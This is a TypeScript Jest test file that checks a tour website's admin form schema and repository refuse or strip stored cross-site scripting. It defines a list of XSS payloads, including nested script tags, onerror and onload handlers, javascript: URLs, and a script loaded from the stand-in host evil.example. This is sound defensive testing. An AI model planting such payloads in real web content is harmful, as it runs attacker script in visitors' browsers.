/**
 * @jest-environment node
 */

/**
 * STORED XSS — the adversarial pass, Phase D.
 *
 * ## The threat this file is about
 *
 * Every string on a tour is typed by a signed-in admin and then shown to the
 * public. "Only an admin can write it" bounds WHO can plant a payload; it does
 * not make the payload harmless, because the person who executes it is a
 * visitor, on our domain, in their session. One compromised admin password
 * would otherwise be one stored `<script>` away from every visitor to that
 * tour's page.
 *
 * ## What is asserted, and in what order
 *
 * The defence is two layers and they are tested separately, because each has to
 * stand on its own:
 *
 *  1. `tourFormSchema` / `publishableTourSchema` REFUSE the payload with a
 *     message the admin can act on (`plain-text.ts`).
 *  2. `createTour` / `updateTour` STRIP markup from whatever they are handed,
 *     whether or not layer 1 ran (`sanitize-tour-text.ts`). These assertions
 *     deliberately bypass the schema and hand the repository raw payloads, which
 *     is the only honest way to test a fallback.
 *
 * The third layer — that the rendered public HTML carries no executable payload
 * — is `src/app/tour-packages/__tests__/stored-xss-render.test.tsx`, because it
 * needs a DOM and it asserts something different: not what we store, but what a
 * visitor's browser receives.
 *
 * Prisma is mocked; the assertions are about the DATA handed to the write
 * statements, which is exactly the question "what would have been stored".
 */

const mockGetOptionalPrismaClient = jest.fn();

jest.mock('@/server/db/prisma', () => ({
  getOptionalPrismaClient: () => mockGetOptionalPrismaClient(),
}));

import { createTour, updateTour } from '../tour-repository';
import { parseTourForm, tourFormSchema } from '../tour-form-schema';
import { MARKUP_REJECTED_MESSAGE, containsMarkup } from '../plain-text';
import { sanitizeTourFormValues, toPlainText } from '../sanitize-tour-text';
import type { ParsedTourFormValues } from '../tour-form-schema';

/**
 * The payload set. Not a token `<script>` — the shapes below are the ones that
 * defeat the naive defences someone might reach for instead:
 *
 *  - `NESTED_SCRIPT` defeats "strip `<script>` with a regex": removing the inner
 *    tag from `<scr<script>ipt>` ASSEMBLES a working one.
 *  - `IMG_ONERROR` and `SVG_ONLOAD` need no `<script>` at all, which is why a
 *    script-tag-specific filter is not a defence.
 *  - `ATTRIBUTE_BREAKOUT` is the payload for a value interpolated into an HTML
 *    attribute rather than into element text — a different escape context, and
 *    the one a `title=` or `alt=` would hit.
 *  - `UPPERCASE_SCRIPT` and `BODY_ONLOAD` check the filter is not case- or
 *    tag-specific.
 *  - `COMMENTED_SCRIPT` checks that a payload hidden in an HTML comment is not
 *    passed through as text.
 */
const PAYLOADS = {
  SCRIPT: '<script>alert(1)</script>',
  NESTED_SCRIPT: '<scr<script>ipt>alert(1)</script>',
  IMG_ONERROR: '<img src=x onerror=alert(1)>',
  SVG_ONLOAD: '<svg/onload=alert(1)>',
  ATTRIBUTE_BREAKOUT: '"><script>alert(1)</script>',
  UPPERCASE_SCRIPT: '<SCRIPT SRC=//evil.example/a.js></SCRIPT>',
  BODY_ONLOAD: '<body onload=alert(1)>Spiti',
  COMMENTED_SCRIPT: '<!--<script>alert(1)</script>-->',
  ANCHOR_JAVASCRIPT_URL: '<a href="javascript:alert(1)">Book now</a>',
  IFRAME: '<iframe src="javascript:alert(1)"></iframe>',
} as const;

const ALL_PAYLOADS = Object.values(PAYLOADS);

/** A well-formed tour, so a rejection in a test is about the field under test. */
function values(overrides: Partial<ParsedTourFormValues> = {}): ParsedTourFormValues {
  return {
    name: 'Spiti Valley Circuit',
    slug: 'spiti-valley-circuit',
    destinationSlug: 'spiti-valley',
    category: 'Adventure',
    audienceTags: [],
    durationLabel: '9 Days 8 Nights',
    subtitle: 'Shimla - Kaza - Chandratal',
    shortDescription: 'A high-altitude loop.',
    fullDescription: undefined,
    bestTimeToVisit: undefined,
    priceFrom: '₹42,500',
    priceWas: undefined,
    savingsLabel: undefined,
    seatsLabel: undefined,
    isHot: false,
    inclusions: [],
    exclusions: [],
    itineraryDays: [],
    faqs: [],
    pricingTiers: [],
    coverImage: undefined,
    galleryImages: [],
    brochureFile: undefined,
    ...overrides,
  };
}

interface MockTx {
  tour: { create: jest.Mock; update: jest.Mock; findFirst: jest.Mock; findUnique: jest.Mock };
  brochure: { findUnique: jest.Mock; update: jest.Mock; create: jest.Mock };
  tourItineraryDay: { deleteMany: jest.Mock };
  tourFaq: { deleteMany: jest.Mock };
  tourPricingTier: { deleteMany: jest.Mock };
  tourGalleryImage: { deleteMany: jest.Mock };
}

let tx: MockTx;

function setUpPrisma() {
  tx = {
    tour: {
      create: jest.fn().mockResolvedValue({ slug: 'spiti-valley-circuit' }),
      update: jest.fn().mockResolvedValue({ slug: 'spiti-valley-circuit' }),
      findFirst: jest.fn().mockResolvedValue({ catalogueOrder: 21 }),
      findUnique: jest.fn(),
    },
    brochure: {
      findUnique: jest.fn().mockResolvedValue(null),
      update: jest.fn().mockResolvedValue({}),
      create: jest.fn().mockResolvedValue({}),
    },
    tourItineraryDay: { deleteMany: jest.fn().mockResolvedValue({}) },
    tourFaq: { deleteMany: jest.fn().mockResolvedValue({}) },
    tourPricingTier: { deleteMany: jest.fn().mockResolvedValue({}) },
    tourGalleryImage: { deleteMany: jest.fn().mockResolvedValue({}) },
  };

  mockGetOptionalPrismaClient.mockReturnValue({
    ...tx,
    $transaction: (callback: (client: MockTx) => Promise<unknown>) => callback(tx),
  });
}

beforeEach(() => {
  jest.clearAllMocks();
  setUpPrisma();
});

/**
 * Walks everything a write statement was handed and returns every string in it.
 *
 * Used instead of naming individual columns, so a payload that ends up somewhere
 * unexpected — a nested `create`, a field added later — is still caught. A test
 * that only checks the three columns it thought about is a test that passes the
 * day a fourth column starts carrying the payload.
 */
function allStrings(node: unknown, found: string[] = []): string[] {
  if (typeof node === 'string') found.push(node);
  else if (Array.isArray(node)) for (const item of node) allStrings(item, found);
  else if (node !== null && typeof node === 'object') {
    for (const item of Object.values(node)) allStrings(item, found);
  }
  return found;
}

/**
 * The assertion every "what got stored" test ends in.
 *
 * It is deliberately stricter than "no `<script>`": ANY `<` that could open a
 * tag fails it, because the guarantee being claimed is that stored tour copy is
 * plain text — not that it happens to avoid the payloads this file thought of.
 */
function expectNoMarkupStored(data: unknown) {
  const offending = allStrings(data).filter(containsMarkup);
  expect(offending).toEqual([]);
}

describe('the schema REFUSES markup, on the field the admin can see', () => {
  it.each(ALL_PAYLOADS)('rejects %j in the tour name', (payload) => {
    const result = tourFormSchema.safeParse(values({ name: payload }));
    expect(result.success).toBe(false);
    if (result.success) return;
    expect(result.error.issues[0]?.path).toEqual(['name']);
    expect(result.error.issues[0]?.message).toBe(MARKUP_REJECTED_MESSAGE);
  });

  it.each(ALL_PAYLOADS)('rejects %j in an itinerary day description', (payload) => {
    const result = tourFormSchema.safeParse(
      values({ itineraryDays: [{ title: 'Day 1', description: payload }] })
    );
    expect(result.success).toBe(false);
    if (result.success) return;
    expect(result.error.issues[0]?.path).toEqual(['itineraryDays', 0, 'description']);
  });

  it.each(ALL_PAYLOADS)('rejects %j in an FAQ answer', (payload) => {
    const result = tourFormSchema.safeParse(values({ faqs: [{ question: 'When?', answer: payload }] }));
    expect(result.success).toBe(false);
    if (result.success) return;
    expect(result.error.issues[0]?.path).toEqual(['faqs', 0, 'answer']);
  });

  /**
   * Field-by-field rather than a loop over one payload, because the point is
   * COVERAGE: every free-text field the editor offers, so a field added to the
   * form without the `plainText()` wrapper fails here rather than shipping.
   */
  it.each([
    ['subtitle', { subtitle: PAYLOADS.SCRIPT }],
    ['shortDescription', { shortDescription: PAYLOADS.IMG_ONERROR }],
    ['fullDescription', { fullDescription: PAYLOADS.SVG_ONLOAD }],
    ['durationLabel', { durationLabel: PAYLOADS.SCRIPT }],
    ['bestTimeToVisit', { bestTimeToVisit: PAYLOADS.SCRIPT }],
    ['priceFrom', { priceFrom: PAYLOADS.SCRIPT }],
    ['priceWas', { priceWas: PAYLOADS.SCRIPT }],
    ['savingsLabel', { savingsLabel: PAYLOADS.SCRIPT }],
    ['seatsLabel', { seatsLabel: PAYLOADS.SCRIPT }],
    ['inclusions', { inclusions: [PAYLOADS.SCRIPT] }],
    ['exclusions', { exclusions: [PAYLOADS.IMG_ONERROR] }],
    ['itineraryDays.title', { itineraryDays: [{ title: PAYLOADS.SCRIPT, description: 'ok' }] }],
    ['faqs.question', { faqs: [{ question: PAYLOADS.SCRIPT, answer: 'ok' }] }],
    ['pricingTiers.name', { pricingTiers: [{ name: PAYLOADS.SCRIPT, price: '₹1', description: undefined }] }],
    ['pricingTiers.price', { pricingTiers: [{ name: 'Deluxe', price: PAYLOADS.SCRIPT, description: undefined }] }],
    [
      'pricingTiers.description',
      { pricingTiers: [{ name: 'Deluxe', price: '₹1', description: PAYLOADS.SCRIPT }] },
    ],
  ] as const)('refuses a payload in %s', (_field, override) => {
    const result = tourFormSchema.safeParse(values(override as Partial<ParsedTourFormValues>));
    expect(result.success).toBe(false);
  });

  it('refuses through the PUBLISH schema too, not only the draft one', () => {
    const result = parseTourForm(
      'publish',
      values({
        shortDescription: PAYLOADS.SCRIPT,
        coverImage: {
          url: 'https://res.cloudinary.com/demo/image/upload/v1/c.jpg',
          publicId: 'c',
        },
      })
    );
    expect(result.success).toBe(false);
  });

  /**
   * The other half of a refusal rule: it must not refuse ordinary copy. A
   * validator that rejects "Rooms for < 4 guests" is one an admin works around
   * by pasting the text somewhere it is not checked.
   */
  it.each([
    'Rooms for < 4 guests',
    'Groups of <12 travellers',
    'Tea & coffee included',
    'Price: 5 > 3 and 2 < 4',
    'Day 1: Shimla → Kaza (₹2,500 p/p)',
    '3 nights <> 4 days',
    'Best value — 15% off!',
  ])('accepts ordinary copy: %j', (text) => {
    const result = tourFormSchema.safeParse(values({ shortDescription: text }));
    expect(result.success).toBe(true);
    if (result.success) expect(result.data.shortDescription).toBe(text);
  });
});

describe('the repository STRIPS markup, even when the schema was bypassed', () => {
  /**
   * These hand the repository a `ParsedTourFormValues` that the schema would
   * never have produced. That is the point: layer 2 exists for the write path
   * that does not go through layer 1 — a future import script, a bulk edit, or a
   * change to the schema that drops a `plainText()` wrapper by accident.
   */
  it.each(ALL_PAYLOADS)('creating a tour never stores %j', async (payload) => {
    await createTour(
      values({
        name: payload,
        subtitle: payload,
        shortDescription: payload,
        fullDescription: payload,
        bestTimeToVisit: payload,
        priceFrom: payload,
        priceWas: payload,
        savingsLabel: payload,
        seatsLabel: payload,
        durationLabel: payload,
        inclusions: [payload],
        exclusions: [payload],
        itineraryDays: [{ title: payload, description: payload }],
        faqs: [{ question: payload, answer: payload }],
        pricingTiers: [{ name: payload, price: payload, description: payload }],
      }),
      'draft'
    );

    expect(tx.tour.create).toHaveBeenCalledTimes(1);
    expectNoMarkupStored(tx.tour.create.mock.calls[0][0]);
  });

  it.each(ALL_PAYLOADS)('updating a tour never stores %j', async (payload) => {
    await updateTour(
      'spiti-valley-circuit',
      values({
        name: payload,
        fullDescription: payload,
        itineraryDays: [{ title: payload, description: payload }],
        faqs: [{ question: payload, answer: payload }],
      }),
      'publish'
    );

    expect(tx.tour.update).toHaveBeenCalledTimes(1);
    expectNoMarkupStored(tx.tour.update.mock.calls[0][0]);
  });

  /**
   * The brochure row is written by a SEPARATE statement inside the same
   * transaction (`syncBrochure`), from `values.name`, `values.subtitle` and
   * `values.priceFrom`. A sanitizer applied only to the tour's own columns would
   * leave this row carrying the payload, so it gets its own assertion.
   */
  it('never stores a payload in the brochure row either', async () => {
    await createTour(
      values({
        name: PAYLOADS.SCRIPT,
        subtitle: PAYLOADS.IMG_ONERROR,
        priceFrom: PAYLOADS.SVG_ONLOAD,
        brochureFile: {
          url: 'https://res.cloudinary.com/demo/raw/upload/v1/b.pdf',
          publicId: 'b',
          fileName: `${PAYLOADS.SCRIPT}.pdf`,
          sizeBytes: 100,
        },
      }),
      'draft'
    );

    expect(tx.brochure.create).toHaveBeenCalledTimes(1);
    expectNoMarkupStored(tx.brochure.create.mock.calls[0][0]);
  });

  it('leaves the host-pinned media URLs exactly as they were', async () => {
    const coverUrl = 'https://res.cloudinary.com/demo/image/upload/v1/gty/cover_abc.jpg';
    await createTour(
      values({
        coverImage: { url: coverUrl, publicId: 'gty/cover_abc' },
        galleryImages: [{ url: coverUrl, publicId: 'gty/cover_abc', width: 1, height: 1 }],
      }),
      'draft'
    );

    const data = tx.tour.create.mock.calls[0][0].data;
    expect(data.coverImageUrl).toBe(coverUrl);
    expect(data.galleryImages.create[0].url).toBe(coverUrl);
  });
});

describe('the sanitizer itself', () => {
  it.each(ALL_PAYLOADS)('produces markup-free text from %j', (payload) => {
    const cleaned = toPlainText(payload);
    expect(containsMarkup(cleaned)).toBe(false);
    expect(cleaned.toLowerCase()).not.toContain('<script');
    expect(cleaned.toLowerCase()).not.toContain('onerror');
    expect(cleaned.toLowerCase()).not.toContain('onload');
  });

  it('discards a script tag ENTIRELY, rather than unwrapping it to its code', () => {
    // The distinction matters: unwrapping would leave the literal text
    // `alert(1)` in the tour copy, which is harmless but is visible nonsense the
    // admin never typed.
    expect(toPlainText('<script>alert(1)</script>')).toBe('');
    expect(toPlainText('<style>body{}</style>')).toBe('');
  });

  it('keeps the text content of a formatting tag', () => {
    expect(toPlainText('<b>Deluxe</b> room')).toBe('Deluxe room');
    expect(toPlainText('<a href="https://x.example">Book</a>')).toBe('Book');
  });

  it('assembles nothing from a nested-tag payload', () => {
    // A regex that removed `<script>` from this would CREATE a working tag.
    const cleaned = toPlainText('<scr<script>ipt>alert(1)</script>');
    expect(containsMarkup(cleaned)).toBe(false);
  });

  /**
   * Idempotence. The sanitizer runs on EVERY save, including a save of a tour
   * that was loaded from the database and re-submitted untouched — so a
   * transform that changed its own output would erode the copy a little more
   * each time the admin pressed Save.
   */
  it.each([...ALL_PAYLOADS, 'Tea & coffee', 'Rooms < 4', 'Plain copy.'])(
    'is idempotent for %j',
    (input) => {
      const once = toPlainText(input);
      expect(toPlainText(once)).toBe(once);
    }
  );

  /**
   * The guard clause in `toPlainText`, asserted as the property it exists for:
   * text with no markup comes back BYTE-IDENTICAL. Without it, `sanitize-html`'s
   * output encoding would store `Tea &amp; coffee` and the tour page would show
   * those characters literally.
   */
  it.each([
    'Tea & coffee included',
    'Rooms for < 4 guests',
    'Price: 5 > 3',
    '"Quoted" and \'apostrophed\'',
    '&amp; &lt; &nbsp;',
    'Day 1 → Day 2  (two spaces kept)',
  ])('leaves markup-free text untouched: %j', (text) => {
    expect(toPlainText(text)).toBe(text);
  });

  it('does not touch the fields that are not free text', () => {
    const cleaned = sanitizeTourFormValues(
      values({ slug: 'spiti-valley-circuit', destinationSlug: 'spiti-valley', isHot: true })
    );
    expect(cleaned.slug).toBe('spiti-valley-circuit');
    expect(cleaned.destinationSlug).toBe('spiti-valley');
    expect(cleaned.isHot).toBe(true);
    expect(cleaned.category).toBe('Adventure');
  });

  it('preserves `undefined` on optional fields rather than turning them into empty strings', () => {
    // `''` and `undefined` are NOT interchangeable here — `publishableTourSchema`
    // treats an absent short description as "not ready to publish", and an empty
    // string would read as absent to it but as present to a `?? ` fallback.
    const cleaned = sanitizeTourFormValues(values({ fullDescription: undefined, priceWas: undefined }));
    expect(cleaned.fullDescription).toBeUndefined();
    expect(cleaned.priceWas).toBeUndefined();
  });
});
